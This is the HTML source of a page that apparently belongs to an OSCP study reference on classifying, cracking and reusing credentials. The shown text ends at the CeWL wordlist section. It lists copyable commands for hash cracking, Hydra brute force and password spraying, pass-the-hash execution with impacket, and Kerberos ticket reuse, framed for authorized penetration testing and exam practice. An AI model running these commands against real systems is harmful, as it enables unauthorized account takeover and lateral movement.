@@ -1,0 +1,481 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Credential Classification, Cracking and Reuse."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Credential Classification, Cracking and Reuse | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Credential Classification, Cracking and Reuse."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/"><title>Credential Classification, Cracking and Reuse | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#credential-record">Credential record</a></li><li class="level-2"><a href="#classify-before-acting">Classify before acting</a></li><li class="level-2"><a href="#validate-one-known-password">Validate one known password</a></li><li class="level-2"><a href="#estimate-feasibility">Estimate feasibility</a></li><li class="level-2"><a href="#hashcat-baseline-and-meaningful-modes">Hashcat baseline and meaningful modes</a></li><li class="level-2"><a href="#john-the-ripper-workflow">John the Ripper workflow</a></li><li class="level-2"><a href="#keepass-database">KeePass database</a></li><li class="level-2"><a href="#ssh-private-key-passphrase">SSH private-key passphrase</a></li><li class="level-2"><a href="#linux-password-records">Linux password records</a></li><li class="level-2"><a href="#nt-hash">NT hash</a></li><li class="level-2"><a href="#net-ntlmv2-response">Net-NTLMv2 response</a></li><li class="level-2"><a href="#dcc2--cached-domain-logon">DCC2 / cached domain logon</a></li><li class="level-2"><a href="#kerberos-tickets-and-caches">Kerberos tickets and caches</a></li><li class="level-2"><a href="#credential-guard-boundary">Credential Guard boundary</a></li><li class="level-2"><a href="#failure-routing">Failure routing</a></li><li class="level-2"><a href="#re-enumerate-after-success">Re-enumerate after success</a></li><li class="level-2"><a href="#build-a-small-site-specific-wordlist-with-cewl">Build a small site-specific wordlist with CeWL</a></li><li class="level-2"><a href="#generate-usernames-from-observed-naming-conventions">Generate usernames from observed naming conventions</a></li><li class="level-2"><a href="#targeted-candidates--crunch-cupp-and-rules">Targeted candidates — Crunch, CUPP and rules</a></li><li class="level-2"><a href="#password-protected-zip--direct-test-or-extracted-verifier">Password-protected ZIP — direct test or extracted verifier</a></li><li class="level-2"><a href="#http-basic-authentication--validate-the-challenge-and-failure-signal">HTTP Basic authentication — validate the challenge and failure signal</a></li><li class="level-2"><a href="#change-an-accounts-own-expiredknown-smb-password">Change an account’s own expired/known SMB password</a></li><li class="level-2"><a href="#generate-a-bounded-numeric-list-for-an-observed-identifier-pattern">Generate a bounded numeric list for an observed identifier pattern</a></li><li class="level-2"><a href="#an-application-authenticates-to-your-explicit-smb-endpoint">An application authenticates to your explicit SMB endpoint</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="credential-classification-cracking-and-reuse">Credential Classification, Cracking and Reuse</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/04-shells-transfers-credentials/README.md">← Stage index</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/credentials-cracking.md">Credential cheatsheet</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/06-ad-lateral-movement/README.md">AD procedures</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/credentials.md">Recover and use authentication material</a>; <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/ad-identities.md">Gain a more useful domain identity</a></p>
+<blockquote>
+<p><strong>Purpose:</strong> distinguish authentication material, estimate whether offline recovery is worthwhile, and test only compatible, evidence-backed uses. Actual credentials belong in private records.</p>
+</blockquote>
+<h2 id="credential-record">Credential record</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">SOURCE -> MATERIAL/FORMAT -> LOCAL/DOMAIN/APPLICATION IDENTITY
+-> POSSIBLE USE -> SERVICE/PROTOCOL -> AUTHENTICATION
+-> AUTHORIZATION -> NEW ACCESS -> RE-ENUMERATION
+</code></pre>
+<p>Record source, claimed identity, format evidence, possible uses, tested service, result and resulting rights together.</p>
+<h2 id="classify-before-acting">Classify before acting</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Material</th><th>Recognition</th><th>Compatible use</th></tr></thead><tbody><tr><td>Cleartext password</td><td>Text tied to an identity/source</td><td>Normal protocol/application login</td></tr><tr><td>SSH private key</td><td>OpenSSH/PEM private-key block</td><td>SSH public-key authentication; recover passphrase offline if protected</td></tr><tr><td>Linux password record</td><td><code>USER:$id$salt$digest:...</code></td><td>Offline recovery with complete record/format</td></tr><tr><td>Application/file verifier</td><td>Tool-specific <code>$...$</code> or documented digest</td><td>Offline recovery with matching mode/parser</td></tr><tr><td>NT hash</td><td>Usually 32 hex from SAM/LSASS/NTDS context</td><td>Offline recovery; PtH where NTLM and the client support it</td></tr><tr><td>Net-NTLMv2 response</td><td><code>USER::DOMAIN:challenge:proof:blob</code></td><td>Offline recovery or live relay under specific conditions; not PtH material</td></tr><tr><td>DCC2/MSCache v2</td><td>Username-dependent cached-domain verifier</td><td>Offline recovery; not ordinary PtH material</td></tr><tr><td>Kerberos ticket</td><td><code>.kirbi</code>, ccache or in-memory cache</td><td>Ticket-specific access subject to realm, SPN, validity, clock and route</td></tr><tr><td>Kerberos roast material</td><td><code>$krb5asrep$...</code> or <code>$krb5tgs$...</code></td><td>Offline recovery with matching enctype/mode</td></tr><tr><td>Session/API token</td><td>Cookie, bearer/JWT or application token</td><td>Issuing application and authorization context only</td></tr></tbody></table>
+<p>Do not feed unknown strings into random modes. Preserve the source and identity context, then identify the format:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashid HASH_OR_FILE
+john --list=formats | grep -i KEYWORD
+hashcat -hh | grep -i KEYWORD
+hashcat --example-hashes | less
+</code></pre>
+<blockquote>
+<p><strong>Failure cue:</strong> <code>No hashes loaded</code>, token/line-length errors or zero parsed hashes normally indicate wrong format, mode, damaged input or unsupported version—not a strong password.</p>
+</blockquote>
+<h2 id="validate-one-known-password">Validate one known password</h2>
+<p>Use the normal client for the observed service:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ssh -o PreferredAuthentications=password -p PORT USER@TARGET
+nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
+evil-winrm -i TARGET -u USER -p 'PASSWORD'
+xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore
+</code></pre>
+<p>Local Windows account:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nxc smb TARGET --local-auth -u USER -p 'PASSWORD' --shares
+</code></pre>
+<blockquote>
+<p><strong>Decisive output:</strong> the destination service accepts the intended identity. Share, session or action access is a separate authorization result.</p>
+</blockquote>
+<details>
+<summary><strong>Variant — known user, targeted password dictionary</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hydra -l USER -P WORDLIST -s PORT -t 4 -f ssh://TARGET
+hydra -l USER -P WORDLIST -t 1 -f rdp://TARGET
+</code></pre>
+<p>Use only on an assigned target after checking lockout and rate controls. Confirm every reported success with the normal client.</p>
+</details>
+<details>
+<summary><strong>Variant — one password across an authorized user list</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hydra -L USERS -p 'PASSWORD' -s PORT -t 1 rdp://TARGET
+nxc smb TARGET -d DOMAIN -u USERS -p 'PASSWORD' --continue-on-success
+</code></pre>
+<p>One attempt per account can still trigger lockout or monitoring. Establish scope, threshold/window and observation period first.</p>
+</details>
+<details>
+<summary><strong>Variant — HTTP POST form</strong></summary>
+<p>Capture a correct request and stable failure marker with Burp:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hydra -l USER -P WORDLIST TARGET http-post-form \
+  '/LOGIN_PATH:username=^USER^&#x26;password=^PASS^:F=STABLE_FAILURE_TEXT'
+</code></pre>
+<p>Dynamic CSRF tokens, cookies, redirects, throttling and uniform responses require manual handling or a different approach. A weak failure marker creates false positives.</p>
+</details>
+<details>
+<summary><strong>RunasCs — test a known password from an existing Windows shell</strong></summary>
+<p>Use a reviewed, compatible build on the current Windows host with a known plaintext password. This creates a new local process/logon context; it is not remote execution and does not turn an NT hash into a password.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">REM Domain account: verify the new process token
+RunasCs.exe USER PASSWORD "cmd /c whoami /all" -d DOMAIN
+
+REM Local account: omit the domain switch for the current host's account
+RunasCs.exe USER PASSWORD "cmd /c whoami /all"
+
+REM Network-only credentials: local identity stays unchanged
+RunasCs.exe USER PASSWORD "cmd /c dir \\TARGET\SHARE" -d DOMAIN -l 9
+</code></pre>
+<blockquote>
+<p><strong>Read:</strong> in the first two forms, whoami identifies the created process; inspect its groups/integrity before claiming escalation. With logon type 9, local whoami is not a credential test: use the remote operation's result. Logon failure → check account scope, password and permitted logon type. An accepted logon with access denied → inspect authorization on that resource.</p>
+</blockquote>
+<p><a href="https://github.com/antonioCoco/RunasCs">RunasCs upstream</a>. Native runas remains an alternative when an interactive password prompt is usable. Neither tool guarantees an elevated token.</p>
+</details>
+<h2 id="estimate-feasibility">Estimate feasibility</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -b -m MODE
+python3 -c "print((CHARSET_SIZE ** LENGTH) / GUESSES_PER_SECOND)"
+</code></pre>
+<p>Use the actual mode and hardware rate. Salts prevent reusable precomputation; iterations and memory-hard KDFs reduce guesses per second. Prefer candidates in this order:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">exact recovered/default candidates -> organization/user/product words
+-> observed policy and mutations -> small dictionary plus rules
+-> known mask/hybrid -> broader curated lists/rules
+-> exhaustive search only when its measured cost is defensible
+</code></pre>
+<p>Preview mutations before spending the candidate budget:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt | head -n 50
+john --wordlist=wordlist.txt --rules=Jumbo --stdout | head -n 50
+</code></pre>
+<h2 id="hashcat-baseline-and-meaningful-modes">Hashcat baseline and meaningful modes</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -a 0 -m MODE hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule --session job
+hashcat -m MODE hashes.txt --show
+</code></pre>
+<blockquote>
+<p><code>-a 0</code> is dictionary mode. Do not use <code>-a 3</code> with a wordlist; attack mode 3 expects a mask.</p>
+</blockquote>
+<p>Common source examples identify NTLM as mode <code>1000</code>, Net-NTLMv2 as <code>5600</code> and KeePass as <code>13400</code>, but confirm against the installed version:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -h | grep -Ei 'NTLM|NetNTLMv2|KeePass|OpenSSH'
+</code></pre>
+<details>
+<summary><strong>Mask and session variants</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -m MODE hashes.txt -a 3 '?u?l?l?l?l?d?d?d' --session targeted-mask
+hashcat --session targeted-mask --restore
+</code></pre>
+<blockquote>
+<p>Mask order is a hypothesis about structure. Estimate its keyspace before committing time.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>Hybrid variant — base word plus three digits</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -a 6 -m MODE hashes.txt wordlist.txt '?d?d?d' --session targeted-hybrid
+</code></pre>
+<p>Use only when evidence supports both the base words and suffix shape.</p>
+</details>
+<h2 id="john-the-ripper-workflow">John the Ripper workflow</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+john --show hash.txt
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">john --format=FORMAT --wordlist=wordlist.txt --rules=Jumbo hash.txt
+john --session=crack-job --wordlist=wordlist.txt hash.txt
+john --restore=crack-job
+</code></pre>
+<p>File-to-hash converters:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">zip2john archive.zip > archive.hash
+7z2john archive.7z > archive.hash
+ssh2john id_rsa > ssh.hash
+keepass2john vault.kdbx > keepass.hash
+pdf2john document.pdf > pdf.hash
+office2john document.docx > office.hash
+rar2john archive.rar > rar.hash
+unshadow passwd.copy shadow.copy > linux.hash
+</code></pre>
+<p>Converter availability varies by package/path; locate it rather than assuming:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">command -v ssh2john || find /usr/share/john -maxdepth 2 -iname '*2john*' 2>/dev/null
+</code></pre>
+<blockquote>
+<p>Preserve the complete converter output. Some formats include a filename label before <code>:</code> that John accepts but Hashcat may require removed from a separate tool-specific copy.</p>
+</blockquote>
+<h2 id="keepass-database">KeePass database</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">keepass2john vault.kdbx > keepass.hash
+john --wordlist=wordlist.txt keepass.hash
+john --show keepass.hash
+</code></pre>
+<p>Hashcat alternative after confirming KDBX/KDF and input format:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -hh | grep -i keepass
+hashcat -a 0 -m 13400 keepass.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+hashcat -m 13400 keepass.hash --show
+</code></pre>
+<blockquote>
+<p>Mode <code>13400</code> covers common KeePass 1/2 AES formats. Installed help and example hashes decide for the actual file. A recovered master password still requires opening and validating the vault.</p>
+</blockquote>
+<h2 id="ssh-private-key-passphrase">SSH private-key passphrase</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ssh2john id_rsa > ssh.hash
+john --wordlist=wordlist.txt ssh.hash
+john --show ssh.hash
+chmod 600 id_rsa
+ssh-keygen -y -f id_rsa > derived.pub
+ssh -vv -i id_rsa -o IdentitiesOnly=yes -p PORT USER@TARGET
+</code></pre>
+<blockquote>
+<p>Cracking a key passphrase unlocks the file; it does not prove the matching public key is authorized. <code>Permission denied (publickey)</code> can mean wrong user/server, missing authorization or server algorithm/policy after a successful local unlock.</p>
+</blockquote>
+<details>
+<summary><strong>Hashcat variant — only for a supported OpenSSH format</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -hh | grep -i 'OpenSSH\|Private Key'
+hashcat -a 0 -m MODE ssh.hash wordlist.txt -r RULE_FILE
+</code></pre>
+<p>Choose <code>MODE</code> from the complete <code>$sshng$...</code> structure and installed help. Token-length or unsupported-cipher errors require a compatible parser/tool, not <code>--force</code> with a wrong mode.</p>
+</details>
+<h2 id="linux-password-records">Linux password records</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">unshadow passwd.copy shadow.copy > linux.hash
+john --wordlist=wordlist.txt --rules=Jumbo linux.hash
+john --show linux.hash
+</code></pre>
+<blockquote>
+<p>Preserve username, UID, shell and lock markers. A recovered password does not override SSH settings, <code>su</code> policy or a disabled account.</p>
+</blockquote>
+<h2 id="nt-hash">NT hash</h2>
+<p>Offline recovery:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -a 0 -m 1000 nt.hash wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+john --format=NT --wordlist=wordlist.txt nt.hash
+</code></pre>
+<p>Compatible SMB validation:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">nxc smb TARGET -d DOMAIN -u USER -H NT_HASH --shares
+smbclient //TARGET/SHARE -U 'DOMAIN\USER' --pw-nt-hash NT_HASH
+</code></pre>
+<blockquote>
+<p>NT hashes come from a producing context such as SAM, LSASS or NTDS. A visually similar 32-hex application digest is not PtH material.</p>
+</blockquote>
+<details>
+<summary><strong>Variant — remote access/execution when the identity has matching rights</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET'
+xfreerdp /v:TARGET /u:'DOMAIN\USER' /pth:NT_HASH /cert:ignore
+</code></pre>
+<p>WMI needs administrative rights plus DCOM/RPC/SMB reachability and normally runs as the authenticated user. PsExec-style execution needs service-control and writable-share rights and commonly yields SYSTEM. RDP hash authentication depends on target/client support and policy. Detailed method selection belongs to the lateral-movement procedure.</p>
+</details>
+<h2 id="net-ntlmv2-response">Net-NTLMv2 response</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -a 0 -m 5600 netntlmv2.hash wordlist.txt
+john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.hash
+</code></pre>
+<blockquote>
+<p>A Net-NTLMv2 response is not an NT hash and cannot be supplied to <code>-H</code> or <code>-hashes</code>. Relay forwards a live authentication exchange and requires received/coerced authentication, compatible protocols, signing/channel-binding conditions and useful rights.</p>
+</blockquote>
+<p>The OSCP+ exam prohibits spoofing, including NBNS. Do not use Responder poisoning on the exam. Keep capture/relay work to explicitly authorized labs and recheck the current guide.</p>
+<h2 id="dcc2--cached-domain-logon">DCC2 / cached domain logon</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hashcat -hh | grep -i 'Domain Cached'
+john --format=mscash2 --wordlist=wordlist.txt dcc2.hash
+</code></pre>
+<blockquote>
+<p>Preserve the username because it participates in the verifier. DCC2 is an offline recovery target, not ordinary PtH material.</p>
+</blockquote>
+<h2 id="kerberos-tickets-and-caches">Kerberos tickets and caches</h2>
+<p>Inspect before use:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">klist
+KRB5CCNAME=TICKET.ccache klist
+impacket-ticketConverter TICKET.kirbi TICKET.ccache
+</code></pre>
+<p>Compatible client example:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">export KRB5CCNAME=TICKET.ccache
+impacket-wmiexec -k -no-pass 'DOMAIN/USER@HOST.DOMAIN'
+</code></pre>
+<blockquote>
+<p>Verify client principal, realm, TGT versus service ticket, SPN, start/end time, clock, DNS/FQDN and routes. A readable cache does not prove authorization. Roasting, forging and detailed PtT/overpass belong to the AD procedures.</p>
+</blockquote>
+<h2 id="credential-guard-boundary">Credential Guard boundary</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-ComputerInfo | Select-Object DeviceGuardSecurityServicesConfigured,DeviceGuardSecurityServicesRunning
+</code></pre>
+<p>Credential Guard can isolate reusable domain secrets from ordinary LSASS memory. It does not erase local SAM, file, vault, DPAPI, ticket, service-configuration or directory-right paths. One failed dump method disproves only that method and context. Intrusive SSP interception changes system state and waits for a future logon; it is not the default Block 5 response.</p>
+<h2 id="failure-routing">Failure routing</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Failure</th><th>Interpretation / next action</th></tr></thead><tbody><tr><td>Timeout/no route</td><td>Fix source position, pivot or service reachability before judging the credential</td></tr><tr><td>Wrong TLS/protocol response</td><td>Reconfirm application and required transport</td></tr><tr><td>Local/domain/UPN mismatch</td><td>Retry only an evidence-backed identity form</td></tr><tr><td>Account disabled/locked/expired/restricted</td><td>Stop guessing; preserve possible credential validity and record state</td></tr><tr><td>Password/public-key/NTLM/Kerberos method rejected</td><td>Choose material/client compatible with server policy</td></tr><tr><td>Authentication succeeds, requested action fails</td><td>Credential is valid; enumerate authorization and another relevant service</td></tr><tr><td>Hash parser rejects input</td><td>Recheck complete line, prefix, converter, mode and version</td></tr><tr><td>Key unlocks but SSH rejects it</td><td>Recheck user, server, authorized-key state and algorithm policy</td></tr><tr><td>Ticket loads but service rejects it</td><td>Check expiry, SPN, realm, clock, DNS and service authorization</td></tr><tr><td>PtH login succeeds but execution fails</td><td>Check admin rights, UAC remote restrictions and method-specific ports/rights</td></tr></tbody></table>
+<h2 id="re-enumerate-after-success">Re-enumerate after success</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">accepted identity -> groups/roles -> reachable services -> shares/files
+-> authenticated application behavior -> accessible hosts/routes
+-> new credentials/tickets/sessions -> privilege and movement handoffs
+</code></pre>
+<p>Verify destination host, accepted identity and actual read/write/execute rights. New hosts/listeners return to discovery; recovered material returns here; operating-system execution enters session handling; domain identities enter AD mapping.</p>
+<h2 id="build-a-small-site-specific-wordlist-with-cewl">Build a small site-specific wordlist with CeWL</h2>
+<p>Use when observed organization, product or account vocabulary could improve an offline recovery attempt. Keep the crawl on the assigned site.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash"># Bounded crawl: depth 1, words of at least five characters
+cewl -d 1 -m 5 --lowercase -w site-words.txt http://TARGET:PORT/
+
+# Review before using it in the existing format-specific recovery command
+head -n 30 site-words.txt
+wc -l site-words.txt
+</code></pre>
